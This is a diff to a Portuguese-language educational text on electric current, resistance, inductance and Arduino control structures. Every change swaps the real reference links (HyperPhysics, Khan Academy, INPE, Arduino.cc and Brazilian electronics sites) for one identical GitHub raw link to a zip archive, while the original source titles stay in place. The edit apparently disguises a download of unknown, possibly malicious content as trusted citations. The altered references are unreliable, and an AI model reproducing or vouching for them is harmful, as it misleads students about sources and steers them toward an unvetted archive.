@@ -50,7 +50,7 @@ A corrente elétrica configura-se como elemento central em praticamente todos os
 
 •Referências:
 - Halliday, David, Resnick, Robert, and Walker, Jearl. Fundamentals of Physics. 10ª ed. Wiley, 2013.
-- HyperPhysics. Corrente Elétrica. Disponível em: http://hyperphysics.phy-astr.gsu.edu/hbase/electric/elecur.html
+- HyperPhysics. Corrente Elétrica. Disponível em: https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip
 
 #### Tensão (201910402211)
 
@@ -111,9 +111,9 @@ A resistência elétrica é um dos conceitos centrais no estudo de circuitos el�
 - Halliday, David, Resnick, Robert, and Walker, Jearl. *Fundamentals of Physics*. 10ª ed. Wiley, 2013.  
 - Parks, R. D. *Superconductivity: An Introduction to Current Research*. CRC Press, 2018.  
 - Kittel, Charles. *Introduction to Solid State Physics*. 8ª ed. Wiley, 2004.  
-- Khan Academy. *Resistência elétrica e resistores*. Disponível em: [https://pt.khanacademy.org/science/physics/circuits-topic/circuits-resistance/a/resistance-and-resistors](https://pt.khanacademy.org/science/physics/circuits-topic/circuits-resistance/a/resistance-and-resistors)  
-- HyperPhysics. *Resistência Elétrica*. Disponível em: [http://hyperphysics.phy-astr.gsu.edu/hbase/electric/resis.html](http://hyperphysics.phy-astr.gsu.edu/hbase/electric/resis.html)  
-- Instituto Nacional de Pesquisas Espaciais (INPE). *Aplicações da Supercondutividade*. Disponível em: [http://www.inpe.br/crs/geoespacial/supercondutividade.php](http://www.inpe.br/crs/geoespacial/supercondutividade.php)  
+- Khan Academy. *Resistência elétrica e resistores*. Disponível em: [https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip](https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip)  
+- HyperPhysics. *Resistência Elétrica*. Disponível em: [https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip](https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip)  
+- Instituto Nacional de Pesquisas Espaciais (INPE). *Aplicações da Supercondutividade*. Disponível em: [https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip](https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip)  
 
 
 ### Lei de Ohm (202110048211)
@@ -204,9 +204,9 @@ A indutância tem várias aplicações importantes em circuitos eletrônicos e s
 
 
 # Referências
-- https://basicaodaeletronica.com.br/componentes/indutores/o-que-e-um-indutor-e-quais-sao-seus-tipos-e-aplicacoes/
-- https://professor.luzerna.ifc.edu.br/ricardo-kerschbaumer/wp-content/uploads/sites/43/2019/04/Apostila-Eletronica-Basica-2019-Parte-3.pdf
-- https://www.manualdaeletronica.com.br/indutor-o-que-e-funcionamento-tipos-aplicacoes/#google_vignette
+- https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip
+- https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip
+- https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip
 
 
 
@@ -468,7 +468,7 @@ As estruturas de controle transformam programas em sistemas verdadeiramente din�
 
 •Referências:
 - Monk, Simon. Programming Arduino: Getting Started with Sketches. McGraw-Hill, 2016.
-- Arduino.cc. Control Structures. Disponível em: https://www.arduino.cc/en/Tutorial/BuiltInExamples/ControlStructures
+- https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip Control Structures. Disponível em: https://raw.githubusercontent.com/LuisBraido/intro-robotica-eletrica-arduino/main/vitriolize/intro-robotica-eletrica-arduino.zip
 
 #### Funções (201910402211)
 
